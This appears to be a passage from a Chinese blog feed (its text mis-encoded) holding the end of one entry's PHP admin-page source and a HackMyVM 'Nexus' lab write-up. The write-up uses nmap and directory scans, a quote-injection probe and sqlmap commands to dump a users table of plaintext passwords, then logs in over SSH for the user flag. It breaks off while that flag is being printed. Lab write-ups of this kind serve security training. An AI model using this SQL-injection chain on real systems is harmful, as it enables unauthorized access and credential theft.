class="hljs-keyword">as</span> <span class="hljs-variable">$user</span> =&gt; <span class="hljs-variable">$count</span>) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$user</span>) . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$count</span> . <span class="hljs-string">&#x27; æ¡åé¦ˆ&lt;/li&gt;&#x27;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/ul&gt;&#x27;</span>;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h3 class=&quot;text-lg font-semibold text-blue-400 mb-2&quot;&gt;å•†å“åé¦ˆç»Ÿè®¡&lt;/h3&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;ul class=&quot;list-disc list-inside text-gray-200&quot;&gt;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$product_counts</span>) === <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;æš‚æ— æ•°æ®&lt;/li&gt;&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$product_counts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$product</span> =&gt; <span class="hljs-variable">$count</span>) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$product</span>) . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$count</span> . <span class="hljs-string">&#x27; æ¡åé¦ˆ&lt;/li&gt;&#x27;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/ul&gt;&#x27;</span>;<br>            <span class="hljs-meta">?&gt;</span><br>        &lt;/div&gt;<br>        <span class="hljs-meta">&lt;?php</span> &#125; <span class="hljs-meta">?&gt;</span><br>    &lt;/div&gt;<br><br>    &lt;footer <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">center</span> <span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-400 <span class="hljs-title">text</span>-<span class="hljs-title">sm</span> <span class="hljs-title">mt</span>-12 <span class="hljs-title">py</span>-6&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">p</span>&gt;Â© 2025 æ˜Ÿé™…å•†åŸ | ç®¡ç†å‘˜ä¸“ç”¨&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">footer</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">// åˆ é™¤æ–‡ä»¶å¤„ç†ï¼ˆå¿…é¡»åœ¨ä»»ä½•è¾“å‡ºå‰ï¼‰</span><br><span class="hljs-class"><span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">logged_in</span>&#x27;]) &amp;&amp; $<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">logged_in</span>&#x27;] === <span class="hljs-title">true</span> &amp;&amp; <span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">delete_file</span>&#x27;])) </span>&#123;<br>    <span class="hljs-variable">$upload_dir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>;<br>    <span class="hljs-variable">$metadata_file</span> = <span class="hljs-variable">$upload_dir</span> . <span class="hljs-string">&#x27;feedbacks.json&#x27;</span>;<br>    <span class="hljs-variable">$del_file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;delete_file&#x27;</span>]);<br>    <span class="hljs-variable">$del_path</span> = <span class="hljs-variable">$upload_dir</span> . <span class="hljs-variable">$del_file</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$del_path</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$del_file</span>, <span class="hljs-string">&#x27;.txt&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$del_path</span>);<br>        <span class="hljs-comment">// åŒæ­¥åˆ é™¤ feedbacks.json ä¸­çš„è®°å½•</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$metadata_file</span>)) &#123;<br>            <span class="hljs-variable">$feedbacks</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$metadata_file</span>), <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$feedbacks</span>)) &#123;<br>                <span class="hljs-variable">$feedbacks</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$feedbacks</span>, function(<span class="hljs-variable">$fb</span>) <span class="hljs-keyword">use</span> ($<span class="hljs-title">del_file</span>) &#123;<br>                    <span class="hljs-title">return</span> $<span class="hljs-title">fb</span>[&#x27;<span class="hljs-title">filename</span>&#x27;] !== $<span class="hljs-title">del_file</span>;<br>                &#125;);<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$metadata_file</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$feedbacks</span>), JSON_PRETTY_PRINT));<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// åˆ é™¤ååˆ·æ–°é¡µé¢ï¼Œé˜²æ­¢é‡å¤æäº¤</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// é¡µé¢ä¸»å†…å®¹è¾“å‡ºå®Œæ¯•åå†ç”Ÿæˆé™æ€é¡µé¢</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] === <span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-variable">$page_content</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/admin.html&#x27;</span>, <span class="hljs-variable">$page_content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;display:none&quot; id=&quot;static-tip&quot;&gt;[debug] é™æ€é¡µé¢å·²ç”Ÿæˆ&lt;/div&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Nexus</title>
    <link href="/2025/06/12/HackMyVM-Nexus/"/>
    <url>/2025/06/12/HackMyVM-Nexus/</url>
    
    <content type="html"><![CDATA[<p>å…¥é—¨sqlé¶æœºã€‚</p><p>é¶æœºIPï¼š192.168.56.118</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><p>nmapï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.118    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 22:47 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 22:47<br>Completed NSE at 22:47, 0.00s elapsed<br>Initiating NSE at 22:47<br>Completed NSE at 22:47, 0.00s elapsed<br>Initiating NSE at 22:47<br>Completed NSE at 22:47, 0.00s elapsed<br>Initiating Ping Scan at 22:47<br>Scanning 192.168.56.118 [4 ports]<br>Completed Ping Scan at 22:47, 0.02s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 22:47<br>Completed Parallel DNS resolution of 1 host. at 22:47, 0.02s elapsed<br>Initiating SYN Stealth Scan at 22:47<br>Scanning 192.168.56.118 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.118<br>Discovered open port 80/tcp on 192.168.56.118<br>Completed SYN Stealth Scan at 22:48, 7.88s elapsed (1000 total ports)<br>Initiating Service scan at 22:48<br>Scanning 2 services on 192.168.56.118<br>Completed Service scan at 22:48, 6.03s elapsed (2 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.118<br>Retrying OS detection (try #2) against 192.168.56.118<br>Initiating Traceroute at 22:48<br>Completed Traceroute at 22:48, 0.02s elapsed<br>Initiating Parallel DNS resolution of 2 hosts. at 22:48<br>Completed Parallel DNS resolution of 2 hosts. at 22:48, 0.04s elapsed<br>NSE: Script scanning 192.168.56.118.<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 5.04s elapsed<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.01s elapsed<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.00s elapsed<br>Nmap scan report for 192.168.56.118<br>Host is up (0.0013s latency).<br>Not shown: 998 filtered tcp ports (no-response)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)<br>|_  256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>| http-methods: <br>|_  Supported Methods: HEAD GET POST OPTIONS<br>|_http-server-header: Apache/2.4.62 (Debian)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (97%), Linux 3.2 (96%), Linux 4.4 (94%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (92%), VMware Player virtual NAT device (92%), Microsoft Windows XP SP3 (91%), BlueArc Titan 2100 NAS device (91%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 2 hops<br>TCP Sequence Prediction: Difficulty=257 (Good luck!)<br>IP ID Sequence Generation: Incremental<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 22/tcp)<br>HOP RTT     ADDRESS<br>1   1.01 ms 192.168.21.2<br>2   1.47 ms 192.168.56.118<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.00s elapsed<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.00s elapsed<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds<br>           Raw packets sent: 2072 (94.548KB) | Rcvd: 381 (16.092KB)<br></code></pre></td></tr></table></figure><p>dirsearchï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"> dirsearch -u 192.168.56.118<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/_192.168.56.118/_25-06-11_22-48-38.txt<br><br>Target: http://192.168.56.118/<br><br>[22:48:40] Starting:                                                                                                                                       <br>[22:48:40] 403 -  279B  - /.ht_wsr.txt                                      <br>[22:48:40] 403 -  279B  - /.htaccess.bak1                                   <br>[22:48:40] 403 -  279B  - /.htaccess.orig                                   <br>[22:48:40] 403 -  279B  - /.htaccess.sample<br>[22:48:40] 403 -  279B  - /.htaccess.save<br>[22:48:40] 403 -  279B  - /.htaccess_orig                                   <br>[22:48:40] 403 -  279B  - /.htaccessOLD2<br>[22:48:40] 403 -  279B  - /.htaccess_extra<br>[22:48:40] 403 -  279B  - /.htaccessBAK<br>[22:48:40] 403 -  279B  - /.htaccessOLD<br>[22:48:40] 403 -  279B  - /.htaccess_sc<br>[22:48:40] 403 -  279B  - /.htm                                             <br>[22:48:40] 403 -  279B  - /.html                                            <br>[22:48:40] 403 -  279B  - /.htpasswd_test                                   <br>[22:48:40] 403 -  279B  - /.httr-oauth<br>[22:48:40] 403 -  279B  - /.htpasswds                                       <br>[22:48:41] 403 -  279B  - /.php                                             <br>[22:48:52] 200 -   13KB - /index2.php                                       <br>[22:48:53] 200 -  241B  - /login.php                                        <br>[22:48:58] 403 -  279B  - /server-status                                    <br>[22:48:58] 403 -  279B  - /server-status/ <br></code></pre></td></tr></table></figure><p>gobusterï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">gobuster dir  -u http://192.168.56.118:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.118:80<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              txt,html,zip,php<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 279]<br>/index.html           (Status: 200) [Size: 825]<br>/.php                 (Status: 403) [Size: 279]<br>/login.php            (Status: 200) [Size: 352]<br>/index2.php           (Status: 200) [Size: 75134]<br>/.html                (Status: 403) [Size: 279]<br>/.php                 (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>Progress: 1102795 / 1102800 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>è®¿é—®login.phpå’Œindex.htmléƒ½æ²¡ä¸œè¥¿ï¼Œè®¿é—®index2.php.</p><p>å¥½ç‚«é…·çš„ç•Œé¢ã€‚ã€‚ã€‚ã€‚</p><p>ä¹±ç‚¹ä¸€é€šä¹‹åå¾—åˆ°ä¸€ä¸ªä¿¡æ¯ï¼Œæç¤ºæˆ‘ä»¬è®¿é—®auth-login.phpã€‚</p><p><img src="/2025/06/12/HackMyVM-Nexus/msedge_XqWogGcPyw-1749719066875-1.png"></p><h3 id="GetUser"><a href="#GetUser" class="headerlink" title="GetUser"></a>GetUser</h3><hr><p>è®¿é—®ä¹‹åæ˜¯ä¸ªç™»å½•ç•Œé¢ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹ç™»å½•å‚æ•°ï¼Œè¯•ç”¨å¸¸ç”¨è½»å‹å­—å…¸çˆ†ç ´æ— æœã€‚</p><p><img src="/2025/06/12/HackMyVM-Nexus/vmware_cYvLnbBM6W.png"></p><p>å¯†ç åŠ ä¸ªå•å¼•å·ï¼Œå‘ç°sqlæŠ¥é”™ã€‚</p><p><img src="/2025/06/12/HackMyVM-Nexus/vmware_8mQiP65Dni.png"></p><p>ç›´æ¥ä¸¢ç»™sqlmapã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;1.txt</span><br>POST /login.php HTTP/1.1<br>Host: 192.168.56.118<br>Content-Length: 18<br>Cache-Control: max-age=0<br>Accept-Language: en-US,en;q=0.9<br>Origin: http://192.168.56.118<br>Content-Type: application/x-www-form-urlencoded<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://192.168.56.118/auth-login.php<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>user=admin&amp;pass=1&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs mysql">sqlmap -l 1.txt --batch --dbs<br>.......<br>[23:18:46] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Debian<br>web application technology: Apache 2.4.62<br>back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)<br>[23:18:46] [INFO] fetching database names<br>[23:18:46] [INFO] retrieved: &#x27;information_schema&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;sion&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;mysql&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;performance_schema&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;Nebuchadnezzar&#x27;<br>[23:18:46] [INFO] retrieved: &#x27;sys&#x27;<br>available databases [6]:<br>[*] information_schema<br>[*] mysql<br>[*] Nebuchadnezzar<br>[*] performance_schema<br>[*] sion<br>[*] sys<br>[23:18:46] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#x27;/root/.local/share/sqlmap/output/results-06112025_1118pm.csv&#x27;                                                                                                                                                 <br>[23:18:46] [WARNING] your sqlmap version is outdated<br><br>sqlmap -l 1.txt --batch -D Nebuchadnezzar --tables<br>......<br>[23:21:36] [INFO] fetching tables for database: &#x27;Nebuchadnezzar&#x27;<br>[23:21:36] [INFO] retrieved: &#x27;users&#x27;<br>Database: Nebuchadnezzar<br>[1 table]<br>+-------+<br>| users |<br>+-------+<br><br>sqlmap -l 1.txt --batch -D Nebuchadnezzar -T users --dump<br>.......<br>[23:22:13] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Debian<br>web application technology: Apache 2.4.62<br>back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)<br>[23:22:13] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;Nebuchadnezzar&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;id&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;int(11)&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;username&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;varchar(50)&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;password&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;varchar(255)&#x27;<br>[23:22:13] [INFO] fetching entries for table &#x27;users&#x27; in database &#x27;Nebuchadnezzar&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;1&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;F4ckTh3F4k3H4ck3r5&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;shelly&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;2&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;cambiame2025&#x27;<br>[23:22:13] [INFO] retrieved: &#x27;admin&#x27;<br>Database: Nebuchadnezzar<br>Table: users<br>[2 entries]<br>+----+--------------------+----------+<br>| id | password           | username |<br>+----+--------------------+----------+<br>| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |<br>| 2  | cambiame2025       | admin    |<br>+----+--------------------+----------+<br></code></pre></td></tr></table></figure><p>å¾—åˆ°è´¦å·å’Œå¯†ç ï¼Œä¹‹å‰çš„webç«¯ç™»ä¸Šå»æ²¡ä¸œè¥¿ï¼Œè¯•è¯•sshå¯ä»¥è¿ä¸Šå»ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh shelly@192.168.56.118                                <br>The authenticity of host &#x27;192.168.56.118 (192.168.56.118)&#x27; can&#x27;t be established.<br>ED25519 key fingerprint is SHA256:r1lUfXxL8Fd1e/Q87Jno3P3xHjMTUwmJlKfcsl0AST8.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;192.168.56.118&#x27; (ED25519) to the list of known hosts.<br>**************************************************************<br>HackMyVM System                                              *<br>                                                             *<br>   *  .  . *       *    .        .        .   *    ..        *<br> .    *        .   ###     .      .        .            *    *<br>    *.   *        #####   .     *      *        *    .       *<br>  ____       *  ######### *    .  *      .        .  *   .   *<br> /   /\  .     ###\#|#/###   ..    *    .      *  .  ..  *   *<br>/___/  ^8/      ###\|/###  *    *            .      *   *    *<br>|   ||%%(        # &#125;|&#123;  #                                    *<br>|___|,  \\         &#125;|&#123;                                       *<br>                                                             *<br>                                                             *<br>Wellcome to Nexus Vault.                                     *<br>**************************************************************<br>shelly@192.168.56.118&#x27;s password: <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#####################</span></span><br>DONT TOUCH MY SYSTEM #<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#####################</span></span><br>Last login: Thu May  8 22:44:41 2025 from 192.168.1.10<br>shelly@NexusLabCTF:~$<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°userflagã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">shelly@NexusLabCTF:~$ ls<br>SA<br>shelly@NexusLabCTF:~$ ls -sa<br>total 28<br>4 .  4 ..  4 .bash_logout  4 .bashrc  4 .local  4 .profile  4 SA<br>shelly@NexusLabCTF:~$ cd SA<br>shelly@NexusLabCTF:~/SA$ ls<br>user-flag.txt<br>shelly@NexusLabCTF:~/SA$ cat user-flag.txt <br><br>   â–„â–ˆ    â–ˆâ–„      â–„â–„â–„â–„â–ˆâ–ˆâ–ˆâ–„â–„â–„â–„    â–„â–ˆ    â–ˆâ–„  <br>  â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ   â–„â–ˆâ–ˆâ–€â–€â–€â–ˆâ–ˆâ–ˆâ–€â–€â–€â–ˆâ–ˆâ–„ â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ <br>  â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ    